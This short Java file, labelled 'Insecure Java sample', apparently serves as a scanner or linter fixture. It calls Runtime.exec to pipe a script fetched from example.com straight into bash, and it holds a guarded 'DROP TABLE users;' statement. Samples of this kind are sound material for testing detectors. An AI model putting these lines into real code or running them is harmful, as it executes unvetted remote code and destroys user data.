// Insecure Java sample
public class InsecureJava {
    public static void main(String[] args) throws Exception {
        // Dangerous: execute remote script via shell
        Runtime.getRuntime().exec("curl -fsSL http://example.com/install.sh | bash");

        // Dangerous SQL execution
        java.sql.Statement stmt = null; // placeholder
        if (stmt != null) {
            stmt.execute("DROP TABLE users;");
        }
    }
}

